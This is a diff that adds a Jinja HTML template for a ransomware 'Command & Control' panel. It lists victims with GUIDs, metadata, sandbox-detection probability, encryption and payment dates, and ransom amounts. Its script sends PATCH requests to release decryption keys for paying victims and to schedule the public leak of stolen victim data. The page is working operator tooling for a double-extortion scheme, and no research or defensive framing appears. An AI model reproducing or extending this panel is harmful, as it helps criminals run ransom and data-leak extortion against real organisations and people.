@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Command & Control</title>
+</head>
+<body>
+    <div class="main">
+        <h1>Command & Control</h1>
+        <h3>Last fetched at {{ dt|datetime }}</h3>
+        <table class="center">
+            <thead>
+                <tr>
+                    <th>GUID</th>
+                    <th>Metadata</th>
+                    <th>Probability of Sandbox / Detection</th>
+                    <th>Encrypt</th>
+                    <th>Encrypted at</th>                    
+                    <th>Payed at</th>
+                    <th>Decrypt</th>
+
+                    {% if flag_leak_data == True %}
+                    <th>Release date of data</th>
+                    {% endif %}
+
+                    <th>Description</th>
+                    <th>Ransom</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for client in clients %}
+                <tr>
+                    <td>{{ client.guid }}</td>
+                    <td>{{ client.info }}</td>
+                    <td>{{ client.probability_of_detection }}</td>
+                    <td>{{ client.encrypt }}</td>
+                    <td>{{ client.encrypted_at|date }}</td>
+
+                    {% if client.payed_at %}
+                    <td>{{ client.payed_at|date }}</td>
+                    {% else %}
+                    <td>-</td>
+                    {% endif %}
+                                        
+                    {% if client.decrypt == True %}
+                    <td>Done</td>
+                    {% else %}
+                    <td><input type="checkbox" class="decrypt" name="{{ client.guid }}"></td>
+                    {% endif %}
+                    
+                    {% if flag_leak_data == True %}
+                    {% if client.release_date_of_data >= dt %}
+                    <td><input type="date" class="publish" name="{{ client.guid }}" value="{{ client.release_date_of_data|date }}" min="{{ dt|date }}"></td>
+                    {% else %}
+                    <td>{{ client.release_date_of_data|date }}</td>
+                    {% endif %}
+                    {% endif %}
+                    <td>{{ client.description }}</td>
+                    <td>{{ client.ransom }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    <script lang="js">
+        (function() {
+            // code to enable access to decryption key
+            document.querySelectorAll(".decrypt").forEach(checkbox => {
+                checkbox.addEventListener('change', (event) => {
+                    let guid = event.currentTarget.name
+                    if (event.currentTarget.checked) {
+                            console.log("check")                
+                            fetch('/decrypt/' + guid, {
+                                method: 'PATCH'
+                            }).then((data) => data.text()
+                            ).then((text) => console.log(text))                
+                        } else {
+                            console.log("not check")                
+                        }
+                })
+            });
+
+
+            // code to enable publication of data
+            try {
+                document.querySelectorAll(".publish").forEach(checkbox => {
+                    checkbox.addEventListener('focusout', (event) => {
+                        let guid = event.currentTarget.name
+                        let date = event.currentTarget.value
+                                fetch('/publish/' + guid, {
+                                    method: 'PATCH',
+                                    headers: {
+                                        "Content-Type": "application/json",
+                                    },
+                                    body: JSON.stringify({date: date})
+                                }).then((data) => data.text()
+                                ).then((text) => console.log(text))
+                    })
+                });
+            } catch (error) {
+                console.log("Controls for leaking data are not used.")
+            }
+
+        })();
+    </script>
+    <style>
+        body {
+            font-size: 1em;
+            color: rgb(255, 255, 255);
+            background-color: rgb(21, 32, 43);
+
+        }
+
+        .main {
+            background-color: rgb(25, 39, 52);
+            border-radius: 10px;
+            margin: 20px;
+            padding: 20px;
+            overflow-x: auto;
+            /* white-space: nowrap; */
+        }
+
+        h1,h2,h3 {
+            text-align: center;
+        }
+
+        input[type=checkbox] {
+            transform: scale(2);
+        }
+
+        table.center {
+            margin-left: auto;
+            margin-right: auto;            
+        }
+
+        table thead {
+            background-color: rgb(34, 48, 60);
+        }
+
+        tr:nth-child(even){
+            background-color: rgb(136, 153, 166);
+        }
+
+        th, td {
+            padding: 10px;
+        }
+
+        table {
+            border-collapse: separate;
+            border-spacing: 0;
+            min-width: 350px;
+        }
+
+        table tr th,
+        table tr td {
+            border: 1px solid #bbb;
+        }
+    </style>
+</body>
+</html>
